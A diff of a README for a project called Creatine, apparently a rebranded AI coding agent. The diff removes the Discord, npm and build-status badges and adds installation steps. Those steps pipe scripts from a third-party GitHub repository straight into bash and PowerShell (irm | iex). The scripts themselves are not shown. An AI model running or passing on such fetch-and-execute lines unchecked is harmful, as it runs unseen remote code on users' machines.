@@ -9,9 +9,6 @@
 </p>
 <p align="center">The open source AI coding agent.</p>
 <p align="center">
-  <a href="https://opencode.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
-  <a href="https://www.npmjs.com/package/creatine-ai"><img alt="npm" src="https://img.shields.io/npm/v/creatine-ai?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/creatine/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/creatine/publish.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 [![Creatine Terminal UI](packages/web/src/assets/lander/screenshot.png)](https://creatine.puter.site)
@@ -20,8 +17,14 @@
 
 ### Installation
 
+#### Bash (Linux, MacOS, etc.)
 ```bash
+curl -fsSL https://raw.githubusercontent.com/reaperblitz/Creatine-AI/main/install.sh | bash
+```
 
+#### PowerShell (Windows, Linux, and other PowerShell supported programs OS.)
+```powershell
+irm https://raw.githubusercontent.com/reaperblitz/Creatine-AI/main/install.ps1 | iex
 ```
 
 > [!TIP]
